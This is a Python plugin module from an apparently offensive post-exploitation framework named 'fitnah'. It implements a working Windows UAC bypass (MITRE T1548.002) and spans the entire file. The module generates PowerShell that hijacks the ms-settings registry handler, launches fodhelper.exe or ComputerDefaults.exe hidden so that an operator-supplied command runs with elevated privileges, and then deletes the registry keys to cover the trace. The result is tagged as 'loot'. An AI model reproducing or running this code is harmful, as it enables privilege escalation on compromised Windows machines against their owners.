"""privilege_escalation/uac_bypass — UAC bypass via registry hijack. MITRE T1548.002"""
import subprocess
import time
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class UacBypass(BasePlugin):
    NAME        = "uac_bypass"
    DESCRIPTION = "Bypass UAC via fodhelper/ComputerDefaults registry hijack (T1548.002)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1548.002"
    CATEGORY    = "privilege_escalation"
    VERSION     = "2.0.0"

    schema = ParamSchema().add(
        Param("command", str, required=True,
              help="Command to execute with elevated privileges"),
        Param("method", str, required=False, default="fodhelper",
              help="fodhelper | computerdefaults"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        command = params.get("command", "")
        method  = params.get("method", "fodhelper").lower()

        if not command:
            return ModuleResult.err("command is required")

        ps = self._build_ps(command, method)
        r  = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(f"UAC bypass failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="uac_bypass")

    @staticmethod
    def _build_ps(command: str, method: str) -> str:
        trigger = "fodhelper.exe" if method == "fodhelper" else "ComputerDefaults.exe"
        return f"""
$results = @()
$results += '[*] UAC bypass — {method} registry hijack (T1548.002)'
$regPath = "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command"
try {{
    New-Item -Path $regPath -Force | Out-Null
    Set-ItemProperty -Path $regPath -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path $regPath -Name "(default)"       -Value "{command}" -Force
    $results += "[+] Registry keys written: $regPath"

    Start-Process -FilePath "{trigger}" -WindowStyle Hidden
    $results += "[+] Triggered {trigger}"

    Start-Sleep -Seconds 2

    # Cleanup
    Remove-Item -Path "HKCU:\\Software\\Classes\\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
    $results += "[+] Registry cleanup done"
}} catch {{
    $results += "[-] $($_)"
}}
$results -join "`n"
"""
